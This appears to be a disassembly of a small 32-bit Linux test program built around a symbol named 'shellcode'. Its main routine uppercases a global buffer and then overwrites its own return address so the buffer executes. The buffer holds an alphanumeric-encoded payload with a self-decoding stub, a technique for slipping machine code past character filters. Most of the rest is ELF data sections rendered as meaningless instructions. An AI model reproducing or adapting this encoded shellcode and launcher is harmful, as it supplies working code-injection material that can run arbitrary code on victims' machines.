das
insb   (%dx),%es:(%edi)
imul   $0x6c2d646c,0x2f(%edx),%esp
imul   $0x6f732e78,0x75(%esi),%ebp
xor    %cs:(%eax),%al
add    $0x0,%al
add    %al,(%eax)
adc    %al,(%eax)
add    %al,(%eax)
add    %eax,(%eax)
add    %al,(%eax)
inc    %edi
dec    %esi
push   %ebp
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%edx)
add    %al,(%eax)
add    %al,(%esi)
add    %al,(%eax)
add    %bl,(%eax)
add    %al,(%eax)
add    $0x0,%al
add    %al,(%eax)
adc    $0x0,%al
add    %al,(%eax)
add    (%eax),%eax
add    %al,(%eax)
inc    %edi
dec    %esi
push   %ebp
add    %ah,(%eax)
cmp    -0x72241e14(%ebx),%ebx
xor    %esp,%ebp
xor    0x4b(%edi),%ch
xlat   %ds:(%ebx)
xchg   %eax,%esp
inc    %eax
pinsrw $0x45,(%esi),%mm6
dec    %edi
add    (%eax),%al
add    %al,(%eax)
pop    %es
add    %al,(%eax)
add    %al,(%ecx)
add    %al,(%eax)
add    %al,0x0
and    %al,(%eax)
and    %al,(%eax)
add    %al,(%eax)
add    %al,(%edi)
add    %al,(%eax)
.byte 0x0
lods   %ds:(%esi),%eax
dec    %ebx
jecxz  804818c <_init-0x1ac>
sbb    (%eax),%al
add    %al,(%eax)
adc    (%eax),%al
add    %al,(%eax)
push   %eax
add    %al,(%eax)
add    %ah,(%eax)
add    %al,(%eax)
add    %ah,(%ecx)
add    %al,(%eax)
add    %dl,(%edx)
add    %al,(%eax)
add    %bh,(%esi)
add    %al,(%eax)
add    %dl,(%edx)
add    %al,(%eax)
add    %ch,(%eax)
add    %al,(%eax)
add    %dl,(%edx)
add    %al,(%eax)
add    %dh,(%eax)
add    %al,(%eax)
add    %dl,(%edx)
add    %al,(%eax)
add    %cl,(%ebx)
add    %al,(%eax)
add    %bh,%ah
test   %eax,(%eax,%ecx,1)
add    $0x0,%al
add    %al,(%eax)
adc    %eax,(%eax)
.byte 0xf
add    %ch,0x62(%ecx,%ebp,2)
arpl   %bp,(%esi)
jae    80482c3 <_init-0x75>
cs add %bl,%cs:%ss:0x49(%edi)
dec    %edi
pop    %edi
jae    80482d1 <_init-0x67>
imul   $0x64657375,%fs:0x5f(%esi),%ebp
add    %dh,0x72(%eax)
imul   $0x74730066,0x74(%esi),%ebp
jb     80482dd <_init-0x5b>
outsb  %gs:(%esi),(%dx)
add    %dh,0x75(%edi,%ebp,2)
jo     80482e9 <_init-0x4f>
gs
jb     804827c <_init-0xbc>
pop    %edi
pop    %edi
arpl   %si,0x70(%ecx,%edi,2)
gs
pop    %edi
bound  %ebx,0x6c(%edi)
outsl  %ds:(%esi),(%dx)
arpl   %ax,(%eax)
pop    %edi
pop    %edi
insb   (%dx),%es:(%edi)
imul   $0x6174735f,0x63(%edx),%esp
jb     804830a <_init-0x2e>
pop    %edi
insl   (%dx),%es:(%edi)
popa
imul   $0x6d675f5f,0x0(%esi),%ebp
outsl  %ds:(%esi),(%dx)
outsb  %ds:(%esi),(%dx)
pop    %edi
jae    8048319 <_init-0x1f>
popa
jb     804831c <_init-0x1c>
pop    %edi
pop    %edi
add    %al,0x4c(%edi)
dec    %ecx
inc    %edx
inc    %ebx
pop    %edi
xor    (%esi),%ch
xor    (%eax),%eax
inc    %edi
dec    %esp
dec    %ecx
inc    %edx
inc    %ebx
pop    %edi
xor    (%esi),%ch
xor    %al,(%eax)
add    %al,(%eax)
add    (%eax),%al
add    %al,(%eax)
add    (%eax),%al
add    (%eax),%al
add    (%eax),%al
add    (%eax),%eax
add    %eax,(%eax)
add    %eax,(%eax)
add    (%eax),%al
add    %eax,(%eax)
add    %al,(%eax)
adc    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
adc    0x69(%ecx),%ebp
or     $0x30000,%eax
pop    %edi
add    %al,(%eax)
add    %dl,(%eax)
add    %al,(%eax)
add    %dl,(%eax)
imul   $0x20000,0xd(%ecx),%ebp
imul   $0x0,(%eax),%eax
cld
lahf
add    $0x8,%al
push   %es
add    (%eax),%al
or     $0xa0,%al
add    $0x8,%al
pop    %es
add    %eax,(%eax)
add    %dl,(%eax)
mov    0x2070804,%al
add    %al,(%eax)
adc    $0xa0,%al
add    $0x8,%al
pop    %es
add    (%eax),%eax
add    %bl,(%eax)
mov    0x4070804,%al
add    %al,(%eax)
sbb    $0xa0,%al
add    $0x8,%al
pop    %es
add    $0xa0200000,%eax
add    $0x8,%al
pop    %es
push   %es
push   %ebx
sub    $0x8,%esp
call   8048400 <__x86.get_pc_thunk.bx>
add    $0x1cbf,%ebx
mov    -0x4(%ebx),%eax
test   %eax,%eax
je     8048356 <_init+0x1e>
call   8048380 <__gmon_start__@plt>
add    $0x8,%esp
pop    %ebx
ret
pushl  0x804a004
jmp    *0x804a008
add    %al,(%eax)
jmp    *0x804a00c
push   $0x0
jmp    8048360 <_init+0x28>
jmp    *0x804a010
push   $0x8
jmp    8048360 <_init+0x28>
jmp    *0x804a014
push   $0x10
jmp    8048360 <_init+0x28>
jmp    *0x804a018
push   $0x18
jmp    8048360 <_init+0x28>
jmp    *0x804a01c
push   $0x20
jmp    8048360 <_init+0x28>
jmp    *0x804a020
push   $0x28
jmp    8048360 <_init+0x28>
xor    %ebp,%ebp
pop    %esi
mov    %esp,%ecx
and    $0xfffffff0,%esp
push   %eax
push   %esp
push   %edx
push   $0x80485e0
push   $0x8048570
push   %ecx
push   %esi
push   $0x80484cd
call   80483a0 <__libc_start_main@plt>
hlt
xchg   %ax,%ax
xchg   %ax,%ax
xchg   %ax,%ax
xchg   %ax,%ax
xchg   %ax,%ax
xchg   %ax,%ax
xchg   %ax,%ax
mov    (%esp),%ebx
ret
xchg   %ax,%ax
xchg   %ax,%ax
xchg   %ax,%ax
xchg   %ax,%ax
xchg   %ax,%ax
xchg   %ax,%ax
mov    $0x804a147,%eax
sub    $0x804a144,%eax
cmp    $0x6,%eax
ja     8048420 <deregister_tm_clones+0x10>
ret
mov    $0x0,%eax
test   %eax,%eax
je     804841f <deregister_tm_clones+0xf>
push   %ebp
mov    %esp,%ebp
sub    $0x18,%esp
movl   $0x804a144,(%esp)
call   *%eax
leave
ret
lea    0x0(%esi),%esi
mov    $0x804a144,%eax
sub    $0x804a144,%eax
sar    $0x2,%eax
mov    %eax,%edx
shr    $0x1f,%edx
add    %edx,%eax
sar    %eax
jne    8048459 <register_tm_clones+0x19>
ret
mov    $0x0,%edx
test   %edx,%edx
je     8048458 <register_tm_clones+0x18>
push   %ebp
mov    %esp,%ebp
sub    $0x18,%esp
mov    %eax,0x4(%esp)
movl   $0x804a144,(%esp)
call   *%edx
leave
ret
mov    %esi,%esi
lea    0x0(%edi,%eiz,1),%edi
cmpb   $0x0,0x804a143
jne    804849c <__do_global_dtors_aux+0x1c>
push   %ebp
mov    %esp,%ebp
sub    $0x8,%esp
call   8048410 <deregister_tm_clones>
movb   $0x1,0x804a143
leave
repz ret
xchg   %ax,%ax
mov    0x8049f10,%eax
test   %eax,%eax
je     80484c8 <frame_dummy+0x28>
mov    $0x0,%eax
test   %eax,%eax
je     80484c8 <frame_dummy+0x28>
push   %ebp
mov    %esp,%ebp
sub    $0x18,%esp
movl   $0x8049f10,(%esp)
call   *%eax
leave
jmp    8048440 <register_tm_clones>
nop
jmp    8048440 <register_tm_clones>
push   %ebp
mov    %esp,%ebp
and    $0xfffffff0,%esp
sub    $0x20,%esp
movl   $0x804a060,0x1c(%esp)
jmp    8048523 <main+0x56>
call   80483c0 <__ctype_b_loc@plt>
mov    (%eax),%edx
mov    0x1c(%esp),%eax
movzbl (%eax),%eax
movsbl %al,%eax
add    %eax,%eax
add    %edx,%eax
movzwl (%eax),%eax
movzwl %ax,%eax
and    $0x200,%eax
test   %eax,%eax
je     804851e <main+0x51>
mov    0x1c(%esp),%eax
movzbl (%eax),%eax
movsbl %al,%eax
mov    %eax,(%esp)
call   80483b0 <toupper@plt>
mov    %eax,%edx
mov    0x1c(%esp),%eax
mov    %dl,(%eax)
addl   $0x1,0x1c(%esp)
mov    0x1c(%esp),%eax
movzbl (%eax),%eax
test   %al,%al
jne    80484e0 <main+0x13>
lea    0x18(%esp),%eax
add    $0xc,%eax
mov    %eax,0x18(%esp)
movl   $0x804a060,(%esp)
call   8048390 <strlen@plt>
mov    %eax,0x4(%esp)
movl   $0x8048600,(%esp)
call   8048370 <printf@plt>
mov    0x18(%esp),%eax
mov    $0x804a060,%edx
mov    %edx,(%eax)
leave
ret
xchg   %ax,%ax
xchg   %ax,%ax
xchg   %ax,%ax
xchg   %ax,%ax
xchg   %ax,%ax
xchg   %ax,%ax
xchg   %ax,%ax
push   %ebp
push   %edi
xor    %edi,%edi
push   %esi
push   %ebx
call   8048400 <__x86.get_pc_thunk.bx>
add    $0x1a85,%ebx
sub    $0x1c,%esp
mov    0x30(%esp),%ebp
lea    -0xf4(%ebx),%esi
call   8048338 <_init>
lea    -0xf8(%ebx),%eax
sub    %eax,%esi
sar    $0x2,%esi
test   %esi,%esi
je     80485c9 <__libc_csu_init+0x59>
lea    0x0(%esi),%esi
mov    0x38(%esp),%eax
mov    %ebp,(%esp)
mov    %eax,0x8(%esp)
mov    0x34(%esp),%eax
mov    %eax,0x4(%esp)
call   *-0xf8(%ebx,%edi,4)
add    $0x1,%edi
cmp    %esi,%edi
jne    80485a8 <__libc_csu_init+0x38>
add    $0x1c,%esp
pop    %ebx
pop    %esi
pop    %edi
pop    %ebp
ret
jmp    80485e0 <__libc_csu_fini>
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
repz ret
push   %ebx
sub    $0x8,%esp
call   8048400 <__x86.get_pc_thunk.bx>
add    $0x1a13,%ebx
add    $0x8,%esp
pop    %ebx
ret
add    (%eax),%eax
add    %eax,(%eax)
add    (%eax),%al
push   %ebx
push   $0x636c6c65
outsl  %ds:(%esi),(%dx)
fs and %ch,%fs:%gs:0x6e(%ebp,%eiz,2)
addr16 push $0x64253d74
or     (%eax),%al
add    %ebx,(%ebx)
add    (%ebx),%edi
sub    %al,(%eax)
add    %al,(%eax)
add    $0x0,%al
add    %al,(%eax)
dec    %eax
std
(bad)
incl   0x0(%eax,%eax,1)
add    %dh,0x68fffffe(%ebp)
add    %al,(%eax)
add    %bl,-0x1(%eax)
(bad)
decl   -0x38000000(%eax)
(bad)
(bad)
inc    %esp
add    %al,(%eax)
adc    $0x0,%al
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %edi,0x52(%edx)
add    %al,(%ecx)
jl     804865b <_IO_stdin_used+0x5f>
add    %ebx,(%ebx)
or     $0x4,%al
add    $0x88,%al
add    %eax,(%eax)
add    %ah,(%eax)
add    %al,(%eax)
add    %bl,(%eax,%eax,1)
add    %al,(%eax)
cld
cld
(bad)
pushl  0x0(%eax)
add    %al,(%eax)
add    %cl,(%esi)
or     %al,0xe(%esi)
or     $0x4a,%al
ud2
je     804867b <_IO_stdin_used+0x7f>
js     8048679 <_IO_stdin_used+0x7d>
aas
sbb    (%ebx),%bh
sub    (%edx),%dh
and    $0x22,%al
sbb    $0x0,%al
add    %al,(%eax)
inc    %eax
add    %al,(%eax)
add    %al,-0x2(%ebp)
(bad)
call   *0x0(%ebp)
inc    %ecx
push   %cs
or     %al,0x50d4202(%ebp)
add    0x4040cc5(%ecx),%dl
add    %bh,(%eax)
add    %al,(%eax)
add    %ah,0x0(%eax)
add    %al,(%eax)
enter  $0xfffe,$0xff
popa
add    %al,(%eax)
add    %al,(%eax)
inc    %ecx
push   %cs
or     %al,0xc0e4102(%ebp)
xchg   %eax,(%ebx)
inc    %ebx
push   %cs
adc    %al,0x140e4104(%esi)
addl   $0x48,0x2300e4e
push   %cs
adc    $0x41,%al
ret
push   %cs
adc    %al,-0x3a(%ecx)
push   %cs
or     $0x41,%al
(bad)
push   %cs
or     %al,-0x3b(%ecx)
push   %cs
add    $0x10,%al
add    %al,(%eax)
add    %bl,-0x1040000(%eax,%eax,1)
(bad)
incl   (%edx)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
.byte 0xa0
test   %al,(%eax,%ecx,1)
.byte 0x80
test   %al,(%eax,%ecx,1)
add    %al,(%eax)
add    %eax,(%eax)
add    %al,(%eax)
add    %eax,(%eax)
add    %al,(%eax)
or     $0x0,%al
add    %al,(%eax)
cmp    %al,0xd0804(%ebx)
add    %al,(%eax)
in     $0x85,%al
add    $0x8,%al
sbb    %eax,(%eax)
add    %al,(%eax)
or     %bl,0x1b0804(%edi)
add    %al,(%eax)
add    $0x0,%al
add    %al,(%eax)
sbb    (%eax),%al
add    %al,(%eax)
or     $0x9f,%al
add    $0x8,%al
sbb    $0x0,%al
add    %al,(%eax)
add    $0x0,%al
add    %al,(%eax)
cmc
(bad)
ljmp   *-0x54(%edi)
addl   $0x5,(%eax,%ecx,1)
dec    %esp
(bad)
add    $0x8,%al
push   %es
add    %al,(%eax)
add    %cl,%ah
addl   $0xa,(%eax,%ecx,1)
jae    8049f6a <_DYNAMIC+0x56>
add    %al,(%eax)
or     (%eax),%eax
add    %al,(%eax)
adc    %al,(%eax)
add    %al,(%eax)
adc    $0x0,%eax
add    %al,(%eax)
add    %al,(%ebx)
add    %al,(%eax)
add    %al,(%eax)
mov    0x20804,%al
add    %al,(%eax)
xor    %al,(%eax)
add    %al,(%eax)
adc    $0x0,%al
add    %al,(%eax)
adc    %eax,(%eax)
add    %al,(%eax)
pop    %ss
add    %al,(%eax)
add    %cl,(%eax)
addl   $0x11,(%eax,%ecx,1)
add    %al,(%eax)
add    %al,(%eax)
addl   $0x12,(%eax,%ecx,1)
add    %al,(%eax)
add    %cl,(%eax)
add    %al,(%eax)
add    %dl,(%ebx)
add    %al,(%eax)
add    %cl,(%eax)
add    %al,(%eax)
add    %bh,%dh
(bad)
ljmp   *-0x30(%edi)
(bad)
add    $0x8,%al
(bad)
(bad)
ljmp   *0x1(%edi)
add    %al,(%eax)
add    %dh,%al
(bad)
ljmp   *-0x40(%edi)
(bad)
add    $0x8,%al
add    %al,(%eax)
adc    $0x9f,%al
add    $0x8,%al
jbe    8049f91 <_DYNAMIC+0x7d>
add    $0x8,%al
xchg   %al,-0x7c69f7fc(%ebx)
add    $0x8,%al
cmpsb  %es:(%edi),%ds:(%esi)
addl   $0xffffffb6,(%eax,%ecx,1)
addl   $0xffffffc6,(%eax,%ecx,1)
.byte 0x83
add    $0x8,%al
add    %al,(%eax)
jmp    804a064 <shellcode+0x4>
jmp    804a069 <shellcode+0x9>
call   804a062 <shellcode+0x2>
pop    %edi
sub    $0xffffffdf,%edi
push   %edi
pop    %esi
sub    %ecx,%ecx
add    $0xb8,%cl
mov    (%edi),%al
sub    $0x41,%al
shl    $0x4,%al
inc    %edi
add    (%edi),%al
sub    $0x41,%al
mov    %al,(%esi)
inc    %esi
inc    %edi
dec    %ecx
loop   804a077 <shellcode+0x17>
inc    %esp
inc    %edx
dec    %ebp
inc    %ecx
inc    %esi
inc    %ecx
inc    %ebp
inc    %ecx
dec    %ecx
dec    %edx
dec    %ebp
inc    %esp
inc    %esi
inc    %ecx
inc    %ebp
inc    %ecx
inc    %esi
inc    %ecx
dec    %ecx
dec    %edx
dec    %edi
inc    %edx
dec    %esp
inc    %ecx
inc    %edi
inc    %edi
dec    %ebp
dec    %esi
dec    %ecx
inc    %ecx
inc    %esp
inc    %edx
dec    %esi
inc    %ebx
inc    %esi
inc    %ebx
inc    %edi
inc    %edi
inc    %edi
dec    %ecx
inc    %edx
inc    %esp
dec    %esi
inc    %ebx
inc    %ebp
inc    %esp
inc    %edi
inc    %edi
inc    %esi
inc    %esp
dec    %ecx
dec    %edx
dec    %edi
inc    %edx
inc    %edi
dec    %ebx
inc    %edx
inc    %ecx
inc    %esi
inc    %edx
inc    %esi
inc    %ecx
dec    %ecx
dec    %edx
dec    %edi
inc    %edx
dec    %esp
inc    %ecx
inc    %edi
inc    %edi
dec    %ebp
dec    %esi
dec    %ecx
inc    %ecx
inc    %ebp
inc    %ecx
dec    %ecx
dec    %edx
inc    %ebp
inc    %ebp
inc    %ebx
inc    %ebp
inc    %ecx
inc    %ebp
inc    %ebp
inc    %esp
inc    %ebp
inc    %esp
dec    %esp
inc    %ecx
inc    %edi
inc    %edi
dec    %ebp
dec    %esi
dec    %ecx
inc    %ecx
dec    %ecx
inc    %esp
dec    %ebp
inc    %ebp
inc    %ecx
dec    %ebp
inc    %esi
inc    %ebx
inc    %esi
inc    %ebx
inc    %ebp
inc    %esp
dec    %esp
inc    %ecx
inc    %edi
inc    %edi
dec    %ebp
dec    %esi
dec    %ecx
inc    %ecx
dec    %edx
inc    %esp
dec    %ecx
dec    %edx
dec    %esi
inc    %edx
dec    %esp
inc    %ecx
inc    %esp
push   %eax
dec    %ebp
dec    %esi
dec    %ecx
inc    %ecx
inc    %ebp
inc    %edx
dec    %ecx
inc    %ecx
push   %eax
dec    %edx
inc    %ecx
inc    %esp
dec    %eax
inc    %esi
push   %eax
inc    %edi
inc    %esi
inc    %ebx
inc    %edi
dec    %ecx
inc    %edi
dec    %edi
inc    %ebx
push   %eax
dec    %eax
inc    %esp
inc    %edi
dec    %ecx
inc    %edi
dec    %ecx
inc    %ebx
push   %eax
inc    %ebx
push   %eax
inc    %edi
inc    %ebx
inc    %edi
dec    %edx
dec    %ecx
dec    %edx
dec    %edi
inc    %esp
inc    %esi
inc    %ebx
inc    %esi
inc    %esp
dec    %ecx
dec    %edx
dec    %edi
inc    %edx
dec    %esp
inc    %ecx
inc    %ecx
dec    %esp
dec    %ebp
dec    %esi
dec    %ecx
inc    %ecx
inc    %edi
inc    %ebx
inc    %ebx
cmp    (%eax),%ah
sub    %dl,0x62(%ebp)
jne    78 <_init-0x80482c0>
je     81 <_init-0x80482b7>
and    %dh,(%esi,%ebp,1)
cmp    %ch,(%esi)
xor    $0x2d,%al
xor    0x62(%ebp),%dh
jne    86 <_init-0x80482b2>
je     8f <_init-0x80482a9>
xor    %edi,0x31(%esi)
xor    $0x2e,%al
xor    %dh,(%ecx,%ebp,1)
and    %dh,(%esi,%ebp,1)
cmp    %ch,(%esi)
xor    $0x0,%al
inc    %edi
inc    %ebx
inc    %ebx
cmp    (%eax),%ah
sub    %dl,0x62(%ebp)
jne    a1 <_init-0x8048297>
je     aa <_init-0x804828e>
and    %dh,(%esi,%ebp,1)
cmp    %ch,(%esi)
xor    0x62753931,%ch
jne    b0 <_init-0x8048288>
je     b9 <_init-0x804827f>
xor    %ebp,(%ecx)
and    %dh,(%esi,%ebp,1)
cmp    %ch,(%esi)
xor    (%eax),%al
